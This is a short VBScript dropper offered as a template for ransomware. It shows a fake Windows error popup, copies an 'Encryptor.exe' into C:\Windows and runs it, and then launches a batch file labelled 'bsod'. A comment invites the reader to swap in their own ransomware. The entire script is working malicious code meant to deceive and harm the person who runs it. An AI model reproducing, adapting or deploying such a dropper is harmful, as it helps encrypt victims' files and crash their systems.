DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")

''' popup alert
z=MsgBox("Windows ran into a problem.", 0+64, "Windows Alert!!!")

'''
FSO.CopyFile "file\Encryptor.exe","C:\Windows\" ' you can replace this with your own ransomewarte
CreateObject("Wscript.Shell").Run """C:\Windows\Encryptor.exe""", 1, True

''' bsod
CreateObject("Wscript.Shell").Run """222.bat""", 1, True
